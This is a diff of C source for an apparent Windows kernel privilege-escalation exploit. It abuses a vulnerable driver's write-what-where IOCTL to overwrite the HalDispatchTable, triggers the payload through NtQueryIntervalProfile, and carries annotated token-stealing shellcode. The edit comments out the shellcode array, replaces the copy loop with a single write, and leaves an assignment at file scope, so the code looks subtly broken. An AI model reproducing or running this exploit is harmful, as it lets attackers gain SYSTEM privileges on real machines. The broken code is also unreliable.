@@ -16,6 +16,10 @@
 #define HALDISPATCHTABLE 0x339230
 #define JMPRSI_OPCODE 0x66953e
 
+unsigned long long payload[10];
+
+payload[0] = 0x00018825048B4865;
+/*
 const unsigned char payload[] = {
     "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
     "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
@@ -31,7 +35,7 @@ const unsigned char payload[] = {
     "\x48\x31\xC0"                                      // xor rax,rax         ; set NTSTATUS SUCCESS
     "\xC3"                                              // ret                 ; Done!
 };
-
+*/
 struct write_what_where
 {
     void *what;
@@ -294,43 +298,7 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
 void *GenerateShellCode(HANDLE driverHandle)
 {
-    //int shellCodeLen=0;
-    void *shellcode=NULL;
-    size_t payloadSize = 0;
-    int payloadSizeInEight=0;
-    int payloadRemander = 0;
-    int oldPayloadSize = 0;
 
-    payloadSize = sizeof( payload);
-
-    oldPayloadSize = payloadSize;
-
-    printf("[+] Shellcode is located at %p\n",KUSER_SHARED_DATA );
-    printf("[+] Shellcode size: %i\n",payloadSize);
-
-    payloadRemander = payloadSize % 8; 
-
-    payloadSizeInEight = (int ) (payloadSize / 8);
-    //Calculate the padding
-    if (payloadRemander != 0) 
-    {
-        int payloadCal = 8*(payloadSizeInEight+1);
-        int payloadPadding = payloadCal - payloadSize; 
-
-        payloadSize += payloadPadding; 
-    }
-
-    printf("[+] Shellcode size with padding: %i\n",payloadSize);
-    //shellcode= VirtualAlloc(0,payloadSize+10, 0x3000,0x40); 
-
-    //RtlMoveMemory(shellcode,payload,oldPayloadSize);
-
-    printf("[+] Payload size by eigth: %i\n",payloadSizeInEight);
-
-    for (int i = 0; i < payloadSizeInEight;i++)
-    {
-        SendToDriver(driverHandle,0x0022200B,(void*) ( (((unsigned long long*) &payload)+i)), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
-    }
-
+    SendToDriver(driverHandle,0x0022200B,(void*) payload[0], halDispatchTable+0);
     return (void*) KUSER_SHARED_DATA;
 }
